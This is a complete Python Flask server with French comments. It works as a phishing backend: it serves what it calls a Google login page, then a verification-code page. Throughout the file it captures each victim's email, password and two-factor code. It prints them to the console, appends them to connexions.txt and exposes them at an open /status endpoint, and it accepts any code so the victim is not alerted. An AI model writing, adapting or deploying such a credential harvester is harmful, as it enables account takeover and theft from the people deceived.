from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Stockage temporaire des données (en production, utiliser une vraie base de données)
user_data = {}

# ==================== ROUTES POUR LES PAGES HTML ====================

@app.route('/')
def index():
    """Page d'accueil - Formulaire de connexion Google"""
    return render_template('login.html')

@app.route('/code.html')
def code_page():
    """Page de vérification du code"""
    return render_template('code.html')

@app.route('/lg.html')
def success_page():
    """Page de succès après validation"""
    return render_template('lg.html')

# ==================== ROUTES API ====================

@app.route('/envoi', methods=['POST'])
def recevoir_donnees():
    """
    Reçoit les données du formulaire de connexion
    (email et mot de passe)
    """
    try:
        data = request.json
        
        # Récupérer les données
        email = data.get('champ1', '')
        password = data.get('champ2', '')
        
        # Afficher dans la console
        print("\n" + "="*50)
        print("📧 NOUVELLES DONNÉES DE CONNEXION")
        print("="*50)
        print(f"Email/Téléphone : {email}")
        print(f"Mot de passe     : {password}")
        print(f"Horodatage       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*50 + "\n")
        
        # Stocker temporairement (optionnel)
        user_data['email'] = email
        user_data['password'] = password
        user_data['timestamp'] = datetime.now().isoformat()
        
        # Vous pouvez aussi sauvegarder dans un fichier
        with open('connexions.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'='*50}\n")
        
        return jsonify({
            "message": "OK",
            "status": "success"
        }), 200
        
    except Exception as e:
        print(f"❌ Erreur lors de la réception des données: {str(e)}")
        return jsonify({
            "message": "Erreur serveur",
            "status": "error"
        }), 500

@app.route('/code', methods=['POST'])
def recevoir_code():
    """
    Reçoit le code de vérification
    """
    try:
        data = request.json
        code = data.get("code", "")
        
        # Afficher dans la console
        print("\n" + "="*50)
        print("🔐 CODE DE VÉRIFICATION REÇU")
        print("="*50)
        print(f"Code             : {code}")
        print(f"Email associé    : {user_data.get('email', 'N/A')}")
        print(f"Horodatage       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*50 + "\n")
        
        # Stocker le code
        user_data['verification_code'] = code
        user_data['code_timestamp'] = datetime.now().isoformat()
        
        # Sauvegarder dans le fichier
        with open('connexions.txt', 'a', encoding='utf-8') as f:
            f.write(f"Code de vérification: {code}\n")
            f.write(f"Date du code: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
        
        # Vérification du code (optionnel - vous pouvez définir votre propre logique)
        # Par exemple, accepter tous les codes ou vérifier un code spécifique
        
        # Option 1: Accepter tous les codes
        return jsonify({
            "message": "Code accepté",
            "status": "success"
        }), 200
        
        # Option 2: Vérifier un code spécifique (décommentez si besoin)
        # if code == "123456":
        #     return jsonify({
        #         "message": "Code correct",
        #         "status": "success"
        #     }), 200
        # else:
        #     return jsonify({
        #         "message": "Code incorrect",
        #         "status": "error"
        #     }), 400
        
    except Exception as e:
        print(f"❌ Erreur lors de la réception du code: {str(e)}")
        return jsonify({
            "message": "Erreur serveur",
            "status": "error"
        }), 500

@app.route('/status', methods=['GET'])
def status():
    """
    Route pour vérifier l'état du serveur et voir les données collectées
    """
    return jsonify({
        "status": "online",
        "data_collected": user_data,
        "timestamp": datetime.now().isoformat()
    }), 200

# ==================== LANCEMENT DU SERVEUR ====================

if __name__ == "__main__":
    print("\n" + "="*60)
    print("🚀 SERVEUR FLASK DÉMARRÉ")
    print("="*60)
    print("📍 URL: http://127.0.0.1:5000")
    print("📄 Page de connexion: http://127.0.0.1:5000/")
    print("📊 Statut du serveur: http://127.0.0.1:5000/status")
    print("💾 Les données seront sauvegardées dans 'connexions.txt'")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)